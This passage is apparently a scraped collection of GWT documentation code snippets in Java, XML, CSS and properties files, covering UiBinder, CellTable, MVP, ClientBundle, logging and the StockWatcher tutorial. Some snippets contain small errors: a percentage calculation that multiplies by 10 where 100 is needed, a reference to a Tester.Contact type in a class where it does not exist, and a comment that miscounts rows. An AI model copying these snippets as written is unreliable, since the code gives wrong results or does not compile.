EM);\npanel.animate(500);\n```\n\n----------------------------------------\n\nTITLE: Implementing UiBinder Owner Class in Java\nDESCRIPTION: Shows the Java owner class for a UiBinder template. It demonstrates how to create the UiBinder interface, bind the UI, and access elements defined in the XML template.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\npublic class HelloWorld {\n  interface MyUiBinder extends UiBinder<DivElement, HelloWorld> {}\n  private static final MyUiBinder uiBinder = GWT.create(MyUiBinder.class);\n\n  @UiField SpanElement nameSpan;\n\n  private DivElement root;\n\n  public HelloWorld() {\n    root = uiBinder.createAndBindUi(this);\n  }\n\n  public Element getElement() {\n    return root;\n  }\n\n  public void setName(String name) { nameSpan.setInnerText(name); }\n}\n```\n\n----------------------------------------\n\nTITLE: Declarative UI Definition Using UiBinder in XML\nDESCRIPTION: UiBinder allows developers to create user interfaces declaratively using XML rather than programmatically, making code more readable and easier to maintain. This is referenced as one of the major new features in GWT 2.0.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/release-notes.md#2025-04-09_snippet_8\n\nLANGUAGE: XML\nCODE:\n```\n<ui:UiBinder>\n  <!-- UI elements defined here in XML -->\n</ui:UiBinder>\n```\n\n----------------------------------------\n\nTITLE: Implementing EntryPoint for TodoList Application in GWT with Polymer\nDESCRIPTION: This EntryPoint class initializes the TodoList application by loading Polymer element dependencies before starting the application. It uses Polymer.importHref to asynchronously load the required web components and their dependencies.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/elements-buildui.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\npackage org.gwtproject.tutorial.client;\n\nimport com.google.gwt.core.client.EntryPoint;\nimport com.google.gwt.user.client.ui.RootPanel;\nimport com.vaadin.polymer.Polymer;\nimport com.vaadin.polymer.elemental.Function;\nimport com.vaadin.polymer.iron.element.IronIconElement;\nimport com.vaadin.polymer.paper.element.PaperIconItemElement;\n\nimport java.util.Arrays;\n\npublic class TodoList implements EntryPoint {\n\n  public void onModuleLoad() {\n    // We have to load icon sets before run application\n    Polymer.importHref(Arrays.asList(\n           PaperIconItemElement.SRC,\n           IronIconElement.SRC), new Function() {\n      public Object call(Object arg) {\n        // The app is executed when all imports succeed.\n        startApplication();\n        return null;\n      }\n    });\n  }\n\n  private void startApplication() {\n    RootPanel.get().add(new Main());\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Custom CSS Styles for StockWatcher\nDESCRIPTION: This CSS snippet defines custom styles for the StockWatcher application, including styles for the add panel, remove button, and dynamic color changes for stock price changes.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/style.md#2025-04-09_snippet_10\n\nLANGUAGE: css\nCODE:\n```\n/* Add Stock panel */\n.addPanel {\n  margin: 10px 0px 15px 0px;\n}\n\n/* stock list, the Remove button */\n.gwt-Button-remove {\n  width: 50px;\n}\n\n/* Dynamic color changes for the Change field */\n.noChange {\n  color: black;\n}\n\n.positiveChange {\n  color: green;\n}\n\n.negativeChange {\n  color: red;\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Complex Layouts with DockLayoutPanel in GWT UiBinder\nDESCRIPTION: Shows how to use DockLayoutPanel with organizational elements like north, center, and west to create a structured layout with proper content positioning.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_7\n\nLANGUAGE: xml\nCODE:\n```\n<g:DockLayoutPanel unit='EM'>\n  <g:north size='5'>\n    <g:Label>Top</g:Label>\n  </g:north>\n  <g:center>\n    <g:Label>Body</g:Label>\n  </g:center>\n  <g:west size='10'>\n    <g:HTML>\n      <ul>\n        <li>Sidebar</li>\n        <li>Sidebar</li>\n        <li>Sidebar</li>\n      </ul>\n    </g:HTML>\n  </g:west>\n</g:DockLayoutPanel>\n```\n\n----------------------------------------\n\nTITLE: Defining a HelloView Interface with Presenter Pattern in GWT MVP\nDESCRIPTION: A view interface that includes a nested Presenter interface for bi-directional communication between view and presenter. Demonstrates the MVP pattern within the Activities and Places framework.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideMvpActivitiesAndPlaces.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\npublic interface HelloView extends IsWidget {\n    void setName(String helloName);\n    void setPresenter(Presenter presenter);\n\n    public interface Presenter {\n        void goTo(Place place);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using TextResource and ExternalTextResource in GWT\nDESCRIPTION: Demonstrates the implementation and usage of both synchronous TextResource and asynchronous ExternalTextResource for accessing text content.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\ninterface Resources extends ClientBundle {\n  Resources INSTANCE = GWT.create(Resources.class);\n\n  @Source(\"a.txt\")\n  TextResource synchronous();\n\n  @Source(\"b.txt\")\n  ExternalTextResource asynchronous();\n}\n\n// Using a TextResource\nmyTextArea.setInnerText(Resources.INSTANCE.synchronous().getText());\n\n// Using an ExternalTextResource\nResources.INSTANCE.asynchronous().getText(new ResourceCallback<TextResource>() {\n  public void onError(ResourceException e) { ... }\n  public void onSuccess(TextResource r) {\n    myTextArea.setInnerText(r.getText());\n  }\n});\n```\n\n----------------------------------------\n\nTITLE: Configuring XsrfTokenServiceServlet in web.xml\nDESCRIPTION: XML configuration for setting up the XSRF token service servlet and its URL mapping in web.xml\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideSecurityRpcXsrf.md#2025-04-09_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n<servlet>\n  <servlet-name>xsrf</servlet-name>\n  <servlet-class>\n    com.google.gwt.user.server.rpc.XsrfTokenServiceServlet\n  </servlet-class>\n</servlet>\n<servlet-mapping>\n  <servlet-name>xsrf</servlet-name>\n  <url-pattern>/gwt/xsrf</url-pattern>\n</servlet-mapping>\n```\n\n----------------------------------------\n\nTITLE: Configuring GWT Module XML for Theme Selection\nDESCRIPTION: This XML snippet shows how to configure the GWT module file to select a theme for the application. It demonstrates inheriting the core Web Toolkit functionality and selecting the Standard theme by default.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/style.md#2025-04-09_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<module rename-to='stockwatcher'>\n  <!-- Inherit the core Web Toolkit stuff.                        -->\n  <inherits name='com.google.gwt.user.User'/>\n\n  <!-- Inherit the default GWT style sheet.  You can change       -->\n  <!-- the theme of your GWT application by uncommenting          -->\n  <!-- any one of the following lines.                            -->\n  <inherits name='com.google.gwt.user.theme.standard.Standard'/>\n  <!-- <inherits name=\"com.google.gwt.user.theme.chrome.Chrome\"/> -->\n  <!-- <inherits name=\"com.google.gwt.user.theme.dark.Dark\"/>     -->\n\n  <!-- Other module inherits                                      -->\n\n  <!-- Specify the app entry point class.                         -->\n  <entry-point class='com.google.gwt.sample.stockwatcher.client.StockWatcher'/>\n</module>\n```\n\n----------------------------------------\n\nTITLE: Handling AddContactEvent in GWT AppController\nDESCRIPTION: This code demonstrates how to handle the AddContactEvent in the AppController. It adds an event handler that calls doAddNewContact method, which creates a new history item for the 'add' view.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture.md#2025-04-09_snippet_13\n\nLANGUAGE: java\nCODE:\n```\npublic class AppController implements ValueChangeHandler<String> {\n  ...\n  private void bind() {\n    ...\n    eventBus.addHandler(AddContactEvent.TYPE,\n      new AddContactEventHandler() {\n        public void onAddContact(AddContactEvent event) {\n          doAddNewContact();\n        }\n    });\n  }\n\n  private void doAddNewContact() {\n    History.newItem(\"add\");\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Complete 9-Box ClientBundle Resources\nDESCRIPTION: Defines a comprehensive ClientBundle interface for a 9-box layout with all necessary border images. Uses ImageOptions to specify which borders should repeat horizontally or vertically.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_46\n\nLANGUAGE: java\nCODE:\n```\npublic interface Resources extends ClientBundle {\n    Resources INSTANCE = GWT.create(Resources.class);\n\n    @Source(\"bt.png\")\n    @ImageOptions(repeatStyle = RepeatStyle.Horizontal)\n    ImageResource bottomBorder();\n\n    @Source(\"btl.png\")\n    ImageResource bottomLeftBorder();\n\n    @Source(\"btr.png\")\n    ImageResource bottomRightBorder();\n\n    @Source(\"StyleInjectorDemo.css\")\n    CssResource css();\n\n    @Source(\"lr.png\")\n    @ImageOptions(repeatStyle = RepeatStyle.Vertical)\n    ImageResource leftBorder();\n\n    @Source(\"rl.png\")\n    @ImageOptions(repeatStyle = RepeatStyle.Vertical)\n    ImageResource rightBorder();\n\n    @Source(\"tb.png\")\n    @ImageOptions(repeatStyle = RepeatStyle.Horizontal)\n    ImageResource topBorder();\n\n    @Source(\"tbl.png\")\n    ImageResource topLeftBorder();\n\n    @Source(\"tbr.png\")\n    ImageResource topRightBorder();\n  }\n```\n\n----------------------------------------\n\nTITLE: Implementing Fixed-Width CellTable with Contact Data in GWT\nDESCRIPTION: Creates a CellTable with fixed-width columns that expand to fill available space. Demonstrates setting up a Contact data model, creating text columns, and configuring column widths using percentage units.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCellTable.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\n/**\n * Entry point classes define <code>onModuleLoad()</code>.\n */\npublic class Tester implements EntryPoint {\n  // A simple data type that represents a contact.\n  private static class Contact {\n    private final String address;\n    private final String name;\n\n    public Contact(String name, String address) {\n      this.name = name;\n      this.address = address;\n    }\n  }\n\n  // The list of data to display.\n  private static List<Contact> CONTACTS = Arrays.asList(new Contact(\"John\",\n      \"123 Fourth Road\"), new Contact(\"Mary\", \"222 Lancer Lane\"));\n\n  public void onModuleLoad() {\n\n    // Create a CellTable.\n    CellTable<Contact> table = new CellTable<Contact>();\n\n    // Create name column.\n    TextColumn<Contact> nameColumn = new TextColumn<Contact>() {\n      @Override\n      public String getValue(Contact contact) {\n        return contact.name;\n      }\n    };\n\n    // Create address column.\n    TextColumn<Contact> addressColumn = new TextColumn<Contact>() {\n      @Override\n      public String getValue(Contact contact) {\n        return contact.address;\n      }\n    };\n\n    // Add the columns.\n    table.addColumn(nameColumn, \"Name\");\n    table.addColumn(addressColumn, \"Address\");\n\n    // Set the width of the table and put the table in fixed width mode.\n    table.setWidth(\"100%\", true);\n\n    // Set the width of each column.\n    table.setColumnWidth(nameColumn, 35.0, Unit.PCT);\n    table.setColumnWidth(addressColumn, 65.0, Unit.PCT);\n\n    // Set the total row count. This isn't strictly necessary, but it affects\n    // paging calculations, so its good habit to keep the row count up to date.\n    table.setRowCount(CONTACTS.size(), true);\n\n    // Push the data into the widget.\n    table.setRowData(0, CONTACTS);\n\n    // Add it to the root panel.\n    RootPanel.get().add(table);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Associating Main Panel with Root Panel in GWT StockWatcher Application\nDESCRIPTION: This code demonstrates how to implement the StockWatcher entry point class by creating UI elements, assembling them in panels, and connecting them to the HTML host page through the RootPanel. It sets up a stock table with headers and creates an input panel for adding new stocks.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/buildui.md#2025-04-09_snippet_7\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.stockwatcher.client;\n\nimport com.google.gwt.core.client.EntryPoint;\nimport com.google.gwt.user.client.ui.Button;\nimport com.google.gwt.user.client.ui.FlexTable;\nimport com.google.gwt.user.client.ui.HorizontalPanel;\nimport com.google.gwt.user.client.ui.Label;\nimport com.google.gwt.user.client.ui.TextBox;\nimport com.google.gwt.user.client.ui.VerticalPanel;\n\npublic class StockWatcher implements EntryPoint {\n\n  private VerticalPanel mainPanel = new VerticalPanel();\n  private FlexTable stocksFlexTable = new FlexTable();\n  private HorizontalPanel addPanel = new HorizontalPanel();\n  private TextBox newSymbolTextBox = new TextBox();\n  private Button addStockButton = new Button(\"Add\");\n  private Label lastUpdatedLabel = new Label();\n\n  /**\n   * Entry point method.\n   */\n  public void onModuleLoad() {\n    // Create table for stock data.\n    stocksFlexTable.setText(0, 0, \"Symbol\");\n    stocksFlexTable.setText(0, 1, \"Price\");\n    stocksFlexTable.setText(0, 2, \"Change\");\n    stocksFlexTable.setText(0, 3, \"Remove\");\n\n    // Assemble Add Stock panel.\n    addPanel.add(newSymbolTextBox);\n    addPanel.add(addStockButton);\n\n    // Assemble Main panel.\n    mainPanel.add(stocksFlexTable);\n    mainPanel.add(addPanel);\n    mainPanel.add(lastUpdatedLabel);\n\n    // Associate the Main panel with the HTML host page.\n    RootPanel.get(\"stockList\").add(mainPanel);\n\n    // TODO Move cursor focus to the input box.\n\n  }\n\n}\n```\n\n----------------------------------------\n\nTITLE: Handling View Transitions in GWT AppController\nDESCRIPTION: This code snippet demonstrates how to handle view transitions based on history tokens in the onValueChange method. It creates and displays the appropriate presenter based on the current history token.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture.md#2025-04-09_snippet_11\n\nLANGUAGE: java\nCODE:\n```\npublic class AppController implements ValueChangeHandler<String> {\n  ...\n  public void onValueChange(ValueChangeEvent<String> event) {\n    String token = event.getValue();\n\n    if (token != null) {\n      Presenter presenter = null;\n\n      if (token.equals(\"list\")) {\n        presenter = new ContactsPresenter(rpcService, eventBus, new ContactView());\n      }\n      else if (token.equals(\"add\")) {\n        presenter = new EditContactPresenter(rpcService, eventBus, new EditContactView());\n      }\n      else if (token.equals(\"edit\")) {\n        presenter = new EditContactPresenter(rpcService, eventBus, new EditContactView());\n      }\n\n      if (presenter != null) {\n        presenter.go(container);\n      }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Generated Properties File for Simple ui:msg\nDESCRIPTION: The properties file generated from the ui:msg element, showing how spans with ui:field attributes are treated as placeholders.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinderI18n.md#2025-04-09_snippet_7\n\nLANGUAGE: properties\nCODE:\n```\n# Description: closed for business message\n# 0=arg0 (Example: <span id=''>), 1=arg1 (Example: </span>), 2=arg2 (Example: <span id=''>), 3=arg3 (Example: </span>)\nE30D43242E1AD2AC2EFA1AEEEFDFCC33=(closed {0}{1} through {2}{3})\n\n```\n\n----------------------------------------\n\nTITLE: Implementing StockPrice Class with Properties and Methods\nDESCRIPTION: Complete implementation of StockPrice class with getters, setters, and calculation methods for stock data\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/codeclient.md#2025-04-09_snippet_11\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.stockwatcher.client;\n\npublic class StockPrice {\n\n  private String symbol;\n  private double price;\n  private double change;\n\n  public StockPrice() {\n  }\n\n  public StockPrice(String symbol, double price, double change) {\n    this.symbol = symbol;\n    this.price = price;\n    this.change = change;\n  }\n\n  public String getSymbol() {\n    return this.symbol;\n  }\n\n  public double getPrice() {\n    return this.price;\n  }\n\n  public double getChange() {\n    return this.change;\n  }\n\n  public double getChangePercent() {\n    return 10.0 * this.change / this.price;\n  }\n\n  public void setSymbol(String symbol) {\n    this.symbol = symbol;\n  }\n\n  public void setPrice(double price) {\n    this.price = price;\n  }\n\n  public void setChange(double change) {\n    this.change = change;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining a Display Interface in a ContactsPresenter\nDESCRIPTION: This snippet shows how to define a Display interface within a ContactsPresenter class to establish a contract between the presenter and its view. The interface specifies methods for handling button clicks, populating data, and managing row selections without coupling to specific widget implementations.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\npublic class ContactsPresenter implements Presenter {\n  ...\n  public interface Display extends HasValue<List<String>> {\n    HasClickHandlers getAddButton();\n    HasClickHandlers getDeleteButton();\n    HasClickHandlers getList();\n    void setData(List<String> data);\n    int getClickedRow(ClickEvent event);\n    List<Integer> getSelectedRows();\n    Widget asWidget();\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Column Sorting with ListDataProvider in GWT CellTable\nDESCRIPTION: Demonstrates how to implement sortable columns in a CellTable using ListDataProvider. The example shows creation of a contact list table with sortable name column and includes setup of ColumnSortEvent.ListHandler for local sorting.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCellTable.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\n/**\n * Entry point classes define <code>onModuleLoad()</code>.\n */\npublic class CellTableExample implements EntryPoint {\n  // A simple data type that represents a contact.\n  private static class Contact {\n    private final String address;\n    private final String name;\n\n    public Contact(String name, String address) {\n      this.name = name;\n      this.address = address;\n    }\n  }\n\n  // The list of data to display.\n  private static List<Contact> CONTACTS = Arrays.asList(new Contact(\"John\",\n      \"123 Fourth Road\"), new Contact(\"Mary\", \"222 Lancer Lane\"), new Contact(\n      \"Zander\", \"94 Road Street\"));\n\n  public void onModuleLoad() {\n\n    // Create a CellTable.\n    CellTable<Contact> table = new CellTable<Contact>();\n\n    // Create name column.\n    TextColumn<Contact> nameColumn = new TextColumn<Contact>() {\n      @Override\n      public String getValue(Contact contact) {\n        return contact.name;\n      }\n    };\n\n    // Make the name column sortable.\n    nameColumn.setSortable(true);\n\n    // Create address column.\n    TextColumn<Contact> addressColumn = new TextColumn<Contact>() {\n      @Override\n      public String getValue(Contact contact) {\n        return contact.address;\n      }\n    };\n\n    // Add the columns.\n    table.addColumn(nameColumn, \"Name\");\n    table.addColumn(addressColumn, \"Address\");\n\n    // Create a data provider.\n    ListDataProvider<Contact> dataProvider = new ListDataProvider<Contact>();\n\n    // Connect the table to the data provider.\n    dataProvider.addDataDisplay(table);\n\n    // Add the data to the data provider, which automatically pushes it to the\n    // widget.\n    List<Contact> list = dataProvider.getList();\n    for (Contact contact : CONTACTS) {\n      list.add(contact);\n    }\n\n    // Add a ColumnSortEvent.ListHandler to connect sorting to the\n    // java.util.List.\n    ListHandler<Contact> columnSortHandler = new ListHandler<Tester.Contact>(\n        list);\n    columnSortHandler.setComparator(nameColumn,\n        new Comparator<Tester.Contact>() {\n          public int compare(Contact o1, Contact o2) {\n            if (o1 == o2) {\n              return 0;\n            }\n\n            // Compare the name columns.\n            if (o1 != null) {\n              return (o2 != null) ? o1.name.compareTo(o2.name) : 1;\n            }\n            return -1;\n          }\n        });\n    table.addColumnSortHandler(columnSortHandler);\n\n    // We know that the data is sorted alphabetically by default.\n    table.getColumnSortList().push(nameColumn);\n\n    // Add it to the root panel.\n    RootPanel.get().add(table);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Tagged HTMLPanel with Text-containing Widget in ui:msg\nDESCRIPTION: The HTMLPanel with its content wrapped in a ui:msg element, allowing the Hyperlink text to be included in translation.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinderI18n.md#2025-04-09_snippet_14\n\nLANGUAGE: xml\nCODE:\n```\n<g:HTMLPanel>\n  <ui:msg>\n    To do the thing, <g:Hyperlink targetHistoryToken=\"/doThe#thing\">click here</g:Hyperlink>\n    and massage vigorously.\n  </ui:msg>\n</g:HTMLPanel>\n```\n\n----------------------------------------\n\nTITLE: Initializing RequestFactory in Client-side Java\nDESCRIPTION: This snippet demonstrates how to create and initialize a RequestFactory instance on the client side using GWT.create() and an EventBus. This is the entry point for using RequestFactory in client-side code.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideRequestFactory.md#2025-04-09_snippet_15\n\nLANGUAGE: java\nCODE:\n```\nfinal EventBus eventBus = new SimpleEventBus();\nrequestFactory = GWT.create(ExpensesRequestFactory.class);\nrequestFactory.initialize(eventBus);\n```\n\n----------------------------------------\n\nTITLE: Implementing ListDataProvider with CellList in GWT\nDESCRIPTION: This example demonstrates how to use ListDataProvider to bind a java.util.List to a CellList widget. The example creates a data provider, connects it to the widget, and adds data to the list which is automatically displayed in the UI.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCellWidgets.md#2025-04-09_snippet_6\n\nLANGUAGE: java\nCODE:\n```\n/**\n * Entry point classes define <code>onModuleLoad()</code>.\n */\npublic class CellListExample implements EntryPoint {\n  // The list of data to display.\n  private static final List<String> DAYS = Arrays.asList(\"Sunday\", \"Monday\",\n      \"Tuesday\", \"Wednesday\", \"Thursday\", \"Friday\", \"Saturday\");\n\n  public void onModuleLoad() {\n    // Create a cell to render each value in the list.\n    TextCell textCell = new TextCell();\n\n    // Create a CellList that uses the cell.\n    CellList<String> cellList = new CellList<String>(textCell);\n\n    // Set the range to display. In this case, our visible range is smaller than\n    // the data set.\n    cellList.setVisibleRange(1, 3);\n\n    // Create a data provider.\n    ListDataProvider<String> dataProvider = new ListDataProvider<String>();\n    \n    // Connect the list to the data provider.\n    dataProvider.addDataDisplay(cellList);\n    \n    // Add the data to the data provider, which automatically pushes it to the\n    // widget. Our data provider will have seven values, but it will only push\n    // the four that are in range to the list.\n    List<String> list = dataProvider.getList();\n    for (String day : DAYS) {\n      list.add(day);\n    }\n\n    // Add it to the root panel.\n    RootPanel.get().add(cellList);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic GWT Logging Setup in XML and Java\nDESCRIPTION: Shows the minimal configuration required to enable GWT logging in a project's .gwt.xml file and how to create and use a logger in Java code.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideLogging.md#2025-04-09_snippet_0\n\nLANGUAGE: XML\nCODE:\n```\n<inherits name=\"com.google.gwt.logging.Logging\"/>\n```\n\nLANGUAGE: Java\nCODE:\n```\nLogger logger = Logger.getLogger(\"NameOfYourLogger\");\nlogger.log(Level.SEVERE, \"this message should get logged\");\n```\n\n----------------------------------------\n\nTITLE: Implementing Stock Price Generator - Java\nDESCRIPTION: Server-side implementation that generates random stock prices within defined ranges for given symbols\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/RPC.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\npublic StockPrice[] getPrices(String[] symbols) {\n  Random rnd = new Random();\n\n  StockPrice[] prices = new StockPrice[symbols.length];\n  for (int i=0; i<symbols.length; i++) {\n    double price = rnd.nextDouble() * MAX_PRICE;\n    double change = price * MAX_PRICE_CHANGE * (rnd.nextDouble() * 2f - 1f);\n\n    prices[i] = new StockPrice(symbols[i], price, change);\n  }\n\n  return prices;\n}\n```\n\n----------------------------------------\n\nTITLE: Handling Clear Done Menu Click Event in GWT\nDESCRIPTION: UiHandler method that removes completed items from the content panel by iterating through the widgets and checking their status.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/widgets-applogic.md#2025-04-09_snippet_11\n\nLANGUAGE: Java\nCODE:\n```\n       @UiHandler(\"menuClearDone\")\n       protected void menuClearDone(ClickEvent e) {\n         closeMenu();\n         for (int i = content.getWidgetCount() - 1; i > -1; i--) {\n             Item item = (Item)content.getWidget(i);\n             if (item.isDone()) {\n                 content.remove(item);\n             }\n         }\n       }\n```\n\n----------------------------------------\n\nTITLE: Serializing Map with Object Keys to JSON in GWT\nDESCRIPTION: Shows how Maps with reference object keys are serialized as a list of two lists using AutoBean. This example demonstrates a Map<Person, Address> serialization.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideAutoBeans.md#2025-04-09_snippet_6\n\nLANGUAGE: json\nCODE:\n```\n[ \n  [ { \"name\" : \"John Doe\" } , { \"name\" : \"Jim Smith\" } ],\n  [ { \"street\" : \"1234 Maple Ave\" }, { \"street\" : \"5678 Fair Oaks Lane\" } ]\n]\n```\n\n----------------------------------------\n\nTITLE: Implementing ClickHandler for Add Button and Basic Application Structure in GWT\nDESCRIPTION: Core implementation of the StockWatcher application with UI components and a click handler for the Add button. This snippet shows how to create the main UI elements, organize them in panels, and implement a click event handler for the Add button.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/manageevents.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.stockwatcher.client;\n\nimport com.google.gwt.core.client.EntryPoint;\nimport com.google.gwt.event.dom.client.ClickEvent;\nimport com.google.gwt.event.dom.client.ClickHandler;\nimport com.google.gwt.user.client.ui.Button;\nimport com.google.gwt.user.client.ui.FlexTable;\nimport com.google.gwt.user.client.ui.HorizontalPanel;\nimport com.google.gwt.user.client.ui.Label;\nimport com.google.gwt.user.client.ui.RootPanel;\nimport com.google.gwt.user.client.ui.TextBox;\nimport com.google.gwt.user.client.ui.VerticalPanel;\n\npublic class StockWatcher implements EntryPoint {\n\n  private VerticalPanel mainPanel = new VerticalPanel();\n  private FlexTable stocksFlexTable = new FlexTable();\n  private HorizontalPanel addPanel = new HorizontalPanel();\n  private TextBox newSymbolTextBox = new TextBox();\n  private Button addStockButton = new Button(\"Add\");\n  private Label lastUpdatedLabel = new Label();\n\n  /**\n   * Entry point method.\n   */\n  public void onModuleLoad() {\n    // Create table for stock data.\n    stocksFlexTable.setText(0, 0, \"Symbol\");\n    stocksFlexTable.setText(0, 1, \"Price\");\n    stocksFlexTable.setText(0, 2, \"Change\");\n    stocksFlexTable.setText(0, 3, \"Remove\");\n\n    // Assemble Add Stock panel.\n    addPanel.add(newSymbolTextBox);\n    addPanel.add(addStockButton);\n\n    // Assemble Main panel.\n    mainPanel.add(stocksFlexTable);\n    mainPanel.add(addPanel);\n    mainPanel.add(lastUpdatedLabel);\n\n    // Associate the Main panel with the HTML host page.\n    RootPanel.get(\"stockList\").add(mainPanel);\n\n    // Move cursor focus to the input box.\n    newSymbolTextBox.setFocus(true);\n\n    // Listen for mouse events on the Add button.\n    addStockButton.addClickHandler(new ClickHandler() {\n      public void onClick(ClickEvent event) {\n        addStock();\n      }\n    });\n  }\n\n  /**\n   * Add stock to FlexTable. Executed when the user clicks the addStockButton or\n   * presses enter in the newSymbolTextBox.\n   */\n  private void addStock() {\n    // TODO Auto-generated method stub\n  }\n\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing StockService in Java for GWT\nDESCRIPTION: Implements the StockService interface with methods for adding, removing, and retrieving stocks. It uses JDO for persistence and includes user authentication checks.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_24\n\nLANGUAGE: java\nCODE:\n```\npublic class StockServiceImpl extends RemoteServiceServlet implements\nStockService {\n\n  private static final Logger LOG = Logger.getLogger(StockServiceImpl.class.getName());\n  private static final PersistenceManagerFactory PMF =\n      JDOHelper.getPersistenceManagerFactory(\"transactions-optional\");\n\n  public void addStock(String symbol) throws NotLoggedInException {\n    checkLoggedIn();\n    PersistenceManager pm = getPersistenceManager();\n    try {\n      pm.makePersistent(new Stock(getUser(), symbol));\n    } finally {\n      pm.close();\n    }\n  }\n\n  public void removeStock(String symbol) throws NotLoggedInException {\n    checkLoggedIn();\n    PersistenceManager pm = getPersistenceManager();\n    try {\n      long deleteCount = 0;\n      Query q = pm.newQuery(Stock.class, \"user == u\");\n      q.declareParameters(\"com.google.appengine.api.users.User u\");\n      List<Stock> stocks = (List<Stock>) q.execute(getUser());\n      for (Stock stock : stocks) {\n        if (symbol.equals(stock.getSymbol())) {\n          deleteCount++;\n          pm.deletePersistent(stock);\n        }\n      }\n      if (deleteCount != 1) {\n        LOG.log(Level.WARNING, \"removeStock deleted \"+deleteCount+\" Stocks\");\n      }\n    } finally {\n      pm.close();\n    }\n  }\n\n  public String[] getStocks() throws NotLoggedInException {\n    checkLoggedIn();\n    PersistenceManager pm = getPersistenceManager();\n    List<String> symbols = new ArrayList<String>();\n    try {\n      Query q = pm.newQuery(Stock.class, \"user == u\");\n      q.declareParameters(\"com.google.appengine.api.users.User u\");\n      q.setOrdering(\"createDate\");\n      List<Stock> stocks = (List<Stock>) q.execute(getUser());\n      for (Stock stock : stocks) {\n        symbols.add(stock.getSymbol());\n      }\n    } finally {\n      pm.close();\n    }\n    return (String[]) symbols.toArray(new String[0]);\n  }\n\n  private void checkLoggedIn() throws NotLoggedInException {\n    if (getUser() == null) {\n      throw new NotLoggedInException(\"Not logged in.\");\n    }\n  }\n\n  private User getUser() {\n    UserService userService = UserServiceFactory.getUserService();\n    return userService.getCurrentUser();\n  }\n\n  private PersistenceManager getPersistenceManager() {\n    return PMF.getPersistenceManager();\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Generated Properties File for Internationalization\nDESCRIPTION: This snippet shows an example of a generated properties file containing a message for translation, including the MD5 hash key and description.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinderI18n.md#2025-04-09_snippet_1\n\nLANGUAGE: Properties\nCODE:\n```\n# Generated from my.app.HelloWorldMyBinderImplGenMessages\n# for locale default\n\n# Description: Greeting\n022A824F26735ED0582324BE34F3CAE1=Hello, world.\n```\n\n----------------------------------------\n\nTITLE: Implementing Basic CellList in 